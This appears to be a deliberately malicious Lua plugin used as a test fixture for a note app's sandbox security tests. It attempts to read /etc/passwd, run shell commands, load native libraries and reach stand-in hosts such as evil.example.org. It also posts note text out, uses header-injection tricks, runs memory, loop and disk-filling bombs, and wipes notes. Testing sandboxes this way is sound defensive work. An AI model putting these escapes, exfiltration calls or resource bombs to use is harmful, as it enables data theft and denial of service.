-- DELIBERATELY MALICIOUS. Test fixture for the plugin security tests only (never an example, never installed by users).
-- Every attempt logs  name|blocked|reason  or  name|SUCCEEDED|...  The tests assert that nothing escaped.

local function attempt(name, fn)
  local ok, e = pcall(fn)
  hn.log(name .. "|" .. (ok and "SUCCEEDED" or "blocked") .. "|" .. tostring(e):sub(1, 170))
end
local function must_load(src, name)
  local f, e = load(src, name or "=evil")
  if not f then error(e) end
  return f
end

hn.command{ id = "escape", title = "Escape attempts", run = function()
  attempt("io.open read", function() return io.open("/etc/passwd") end)
  attempt("io.open write", function() return assert(io.open("/tmp/hn-evil-demo-should-not-exist", "w")) end)
  attempt("io.popen", function() return io.popen("id") end)
  attempt("os.execute", function() return os.execute("touch /tmp/hn-evil-demo-exec") end)
  attempt("os.getenv", function() return os.getenv("HOME") end)
  attempt("os.remove", function() return os.remove("/tmp/x") end)
  attempt("require os", function() return require("os") end)
  attempt("require io", function() return require("io") end)
  attempt("require ../../etc/passwd", function() return require("../../etc/passwd") end)
  attempt("require /etc/passwd", function() return require("/etc/passwd") end)
  attempt("package.loadlib", function() return package.loadlib("/usr/lib/libc.so.6", "system") end)
  attempt("package.path", function() return package.path end)
  attempt("dofile", function() return dofile("/etc/passwd") end)
  attempt("loadfile", function() return loadfile("/etc/passwd") end)
  attempt("debug.getinfo", function() return debug.getinfo(1) end)
  attempt("debug.sethook", function() return debug.sethook() end)
  attempt("debug.getregistry", function() return debug.getregistry() end)
  attempt("string.dump", function() return string.dump(print) end)
  attempt("load bytecode", function() return must_load("\27Lua\84\0\25\147\13\10\26\10") end)
  attempt("load with io env", function() return must_load("return io.open('/etc/passwd')")() end)
  attempt("_G.io", function() return assert(_G.io) end)
  attempt("rawget os", function() return assert(rawget(_G, "os")) end)
  attempt("_ENV.os", function() return assert(_ENV.os) end)
  attempt("string metatable escape", function() return assert(getmetatable("").__index.os) end)
  attempt("coroutine.wrap(io.open)", function() return coroutine.wrap(io.open)("/etc/passwd") end)
  attempt("collectgarbage stop", function() return collectgarbage("stop") end)
  attempt("collectgarbage setpause", function() return collectgarbage("incremental", 1000, 1000) end)
  attempt("warn", function() return warn("@on") end)
  attempt("getfenv-style upvalue walk", function() return assert(debug.getupvalue(print, 1)) end)
  attempt("hn.__index", function() return assert(getmetatable(hn)) end)
end }

-- Vandalises its own private globals/stdlib: must never be visible to any other plugin.
hn.command{ id = "tamper", title = "Tamper with own environment", run = function()
  hn.http = nil
  string.upper = function() return "pwned" end
  getmetatable("").__index = function() return function() return "pwned" end end
  leak = "from evil"
end }

hn.command{ id = "perms", title = "Calls without permission", run = function()
  attempt("notes.write", function() return hn.notes.write("x.md", "pwn") end)
  attempt("notes.delete", function() return hn.notes.delete("x.md") end)
  attempt("notes.create", function() return hn.notes.create("t", "x") end)
  attempt("notes.read", function() return hn.notes.read("secret.md") end)
  attempt("notes.list", function() return hn.notes.list("") end)
  attempt("clipboard.get", function() return hn.clipboard.get() end)
  attempt("clipboard.set", function() return hn.clipboard.set("pwn") end)
  attempt("theme", function() return hn.theme.set_token("accent", "#f00") end)
  attempt("notes.read traversal", function() return hn.notes.read("../../etc/passwd") end)
end }

hn.command{ id = "net", title = "Network attempts", run = function()
  attempt("http:// plain", function() return assert(hn.http.get("http://api.example.com/x")) end)
  attempt("other host", function() return assert(hn.http.get("https://evil.example.org/x")) end)
  attempt("suffix host", function() return assert(hn.http.get("https://api.example.com.evil.org/x")) end)
  attempt("userinfo trick", function() return assert(hn.http.get("https://api.example.com@evil.org/x")) end)
  attempt("backslash trick", function() return assert(hn.http.get("https://evil.org\\@api.example.com/x")) end)
  attempt("ip literal", function() return assert(hn.http.get("https://127.0.0.1/x")) end)
  attempt("localhost", function() return assert(hn.http.get("https://localhost/x")) end)
  attempt("odd port", function() return assert(hn.http.get("https://api.example.com:8443/x")) end)
  attempt("file scheme", function() return assert(hn.http.get("file:///etc/passwd")) end)
  attempt("ftp scheme", function() return assert(hn.http.get("ftp://api.example.com/x")) end)
  attempt("crlf header", function() return assert(hn.http.get("https://api.example.com/x", { headers = { ["X-A"] = "b\r\nHost: evil.org" } })) end)
  attempt("host header override", function() return assert(hn.http.get("https://api.example.com/x", { headers = { Host = "evil.org" } })) end)
  attempt("cookie header", function() return assert(hn.http.get("https://api.example.com/x", { headers = { Cookie = "a=b" } })) end)
  attempt("huge url", function() return assert(hn.http.get("https://api.example.com/" .. ("a"):rep(5000))) end)
  -- inside its permission: exfiltrating the note text to the host it declared. The sandbox cannot (and does not claim to) stop this.
  attempt("EXFIL to allowed host", function() return assert(hn.http.post("https://api.example.com/collect", hn.note.text())) end)
  local sent = 0
  for i = 1, 40 do local r = hn.http.get("https://api.example.com/flood") if r then sent = sent + 1 end end
  hn.log("flood|sent|" .. sent)
end }

hn.command{ id = "loop", title = "Infinite loop", run = function() while true do end end }
hn.command{ id = "loop-pcall", title = "Infinite loop under pcall", run = function() while true do pcall(function() while true do end end) end end }
hn.command{ id = "memory", title = "Memory bomb", run = function() local t = {} for i = 1, 1e9 do t[i] = {i} end end }
hn.command{ id = "string-bomb", title = "String bomb", run = function() local s = "x" while true do s = s .. s end end }
hn.command{ id = "rep-bomb", title = "string.rep bomb", run = function() return ("x"):rep(1e10) end }
hn.command{ id = "pattern-bomb", title = "Pattern bomb", run = function() return (("a"):rep(20000)):find("(.-)(.-)(.-)(.-)(.-)(.-)b") end }
hn.command{ id = "recursion", title = "Stack bomb", run = function() local function f(n) return 1 + f(n + 1) end return f(1) end }
hn.command{ id = "gc-trap", title = "Looping finalizer", run = function() setmetatable({}, { __gc = function() while true do end end }) end }
hn.command{ id = "sort-bomb", title = "Sort bomb", run = function() local t = {} for i = 1, 400000 do t[i] = i end table.sort(t) end }
hn.command{ id = "move-bomb", title = "table.move bomb", run = function() table.move({}, 1, 2^50, 2) end }
hn.command{ id = "notify-flood", title = "Notification flood", run = function() for i = 1, 1000 do hn.ui.notify("spam " .. i) end end }
hn.command{ id = "storage-flood", title = "Fill the disk", run = function() for i = 1, 100000 do hn.storage.set("k" .. i, ("x"):rep(10000)) end end }
hn.command{ id = "wipe", title = "Destroy the open note (within its permission)", run = function() hn.note.set_text("") end }
hn.on("note.opened", function() while true do end end)
